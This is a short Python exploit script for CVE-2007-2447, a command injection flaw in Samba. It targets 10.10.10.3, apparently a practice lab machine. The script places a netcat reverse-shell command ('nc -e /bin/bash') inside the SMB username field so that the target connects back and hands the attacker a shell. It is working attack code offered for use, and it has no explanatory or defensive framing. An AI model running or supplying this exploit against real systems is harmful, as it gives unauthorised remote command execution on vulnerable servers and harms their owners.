import sys
import socket
from smb.SMBConnection import SMBConnection

#CVE-2007-2447
#Before, you should open a listening port.

#socket initialization
inet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attack_ip = "10.10.10.3"
attack_port = "445"

host_ip = ""
host_port = "1010"

username = f"/=`nohup nc -e /bin/bash {host_ip} {host_port}`"
conn = SMBConnection(username, '', '', '')

try:
    print("CVE-2007-2447")
    print("Trying to establish a reverse shell...")
    conn.connect(attack_ip, attack_port, timeout=5)
except Exception as e:
    sys.exit(e)
